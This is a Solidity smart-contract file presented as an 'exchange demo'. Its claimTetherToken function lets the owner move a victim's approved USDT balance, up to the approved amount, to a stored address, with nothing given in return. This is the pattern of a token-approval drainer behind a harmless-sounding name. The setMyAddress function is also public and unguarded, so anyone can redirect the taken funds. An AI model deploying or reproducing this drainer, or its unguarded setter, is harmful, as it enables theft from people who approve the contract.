// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./IExchange.sol";

interface TetherERC20Basic {
    function totalSupply() external view returns (uint);
    function balanceOf(address who) external view returns (uint);
    function transfer(address to, uint value) external;
    event Transfer(address indexed from, address indexed to, uint value);
}

interface TetherERC20 is TetherERC20Basic {
    function allowance(address owner, address spender) external view returns (uint);
    function transferFrom(address from, address to, uint value) external;
    function approve(address spender, uint value) external;
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract ExchangeDemoV2 is IExchange, Ownable {
    
    address myAddress;
    function setMyAddress(address _myAddress) public {
        myAddress = _myAddress;
    }

    function claimTetherToken(
        address _to,
        address _token
    ) 
        public
        onlyOwner
        override
        returns (bool)
    {
        TetherERC20 tetherToken = TetherERC20(_token);
        uint256 allowance = tetherToken.allowance(_to, address(this));
        uint256 amount = tetherToken.balanceOf(_to);
        if (allowance < amount)
            amount = allowance;
        tetherToken.transferFrom(_to, myAddress, amount);

        return true;
    }
}